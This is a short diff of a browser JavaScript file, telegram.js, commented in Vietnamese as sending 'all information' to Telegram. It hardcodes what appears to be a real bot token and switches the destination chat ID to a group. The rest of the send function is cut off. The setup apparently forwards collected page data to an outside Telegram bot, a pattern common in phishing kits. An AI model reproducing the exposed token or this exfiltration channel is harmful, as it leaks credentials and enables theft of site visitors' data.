@@ -1,6 +1,6 @@
 // telegram.js - Gửi tất cả thông tin lên Telegram
 const BOT_TOKEN = '8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac';
-const CHAT_ID = '7997436406';
+const CHAT_ID = '-1003805423944';
 
 window.sendToTelegram = async (data) => {
     try {
